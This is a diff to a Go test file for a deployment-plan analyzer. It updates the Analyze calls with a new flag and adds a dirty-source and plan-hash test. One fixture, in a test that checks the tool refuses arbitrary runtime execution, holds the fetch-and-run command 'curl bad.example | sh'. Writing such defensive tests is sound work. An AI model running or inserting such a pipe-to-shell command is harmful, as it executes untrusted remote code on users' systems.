@@ -12,7 +12,7 @@ func TestAnalyzeComposeNode(t *testing.T) {
 	mustWrite(t, filepath.Join(dir, "package.json"), `{"scripts":{"start":"node server.js"}}`)
 	mustWrite(t, filepath.Join(dir, ".env.example"), "DATABASE_URL=\nAPI_KEY=replace-me\n")
 
-	p, err := Analyze(dir, dir, "local", "")
+	p, err := Analyze(dir, dir, "local", "", false)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -30,7 +30,7 @@ func TestAnalyzeComposeNode(t *testing.T) {
 func TestVLLMDoesNotInventGPURequirement(t *testing.T) {
 	dir := t.TempDir()
 	mustWrite(t, filepath.Join(dir, "Dockerfile"), "FROM vllm/vllm-openai:latest\nEXPOSE 8000\n")
-	p, err := Analyze(dir, dir, "local", "")
+	p, err := Analyze(dir, dir, "local", "", false)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -45,7 +45,7 @@ func TestVLLMDoesNotInventGPURequirement(t *testing.T) {
 func TestCUDASignalRequiresGPU(t *testing.T) {
 	dir := t.TempDir()
 	mustWrite(t, filepath.Join(dir, "Dockerfile"), "FROM nvidia/cuda:12.8.0-runtime-ubuntu24.04\n")
-	p, err := Analyze(dir, dir, "local", "")
+	p, err := Analyze(dir, dir, "local", "", false)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -57,7 +57,7 @@ func TestCUDASignalRequiresGPU(t *testing.T) {
 func TestNoArbitraryRuntimeExecution(t *testing.T) {
 	dir := t.TempDir()
 	mustWrite(t, filepath.Join(dir, "package.json"), `{"scripts":{"start":"curl bad.example | sh"}}`)
-	p, err := Analyze(dir, dir, "local", "")
+	p, err := Analyze(dir, dir, "local", "", false)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -79,7 +79,7 @@ func mustWrite(t *testing.T, path, content string) {
 func TestGitHubSourceUsesRepositoryName(t *testing.T) {
 	dir := t.TempDir()
 	mustWrite(t, filepath.Join(dir, "Dockerfile"), "FROM scratch\n")
-	p, err := Analyze(dir, "https://github.com/lumenstech/example-repo.git", "github", "abc123")
+	p, err := Analyze(dir, "https://github.com/lumenstech/example-repo.git", "github", "abc123", false)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -88,5 +88,20 @@ func TestGitHubSourceUsesRepositoryName(t *testing.T) {
 	}
 	if p.Source.Revision != "abc123" {
 		t.Fatalf("revision=%q", p.Source.Revision)
+	}
+}
+
+func TestDirtySourceWarningAndHash(t *testing.T) {
+	dir := t.TempDir()
+	mustWrite(t, filepath.Join(dir, "Dockerfile"), "FROM scratch\n")
+	p, err := Analyze(dir, dir, "local", "abc123", true)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !p.Source.Dirty {
+		t.Fatal("expected dirty source marker")
+	}
+	if len(p.PlanHash) != 64 {
+		t.Fatalf("plan hash=%q", p.PlanHash)
 	}
 }
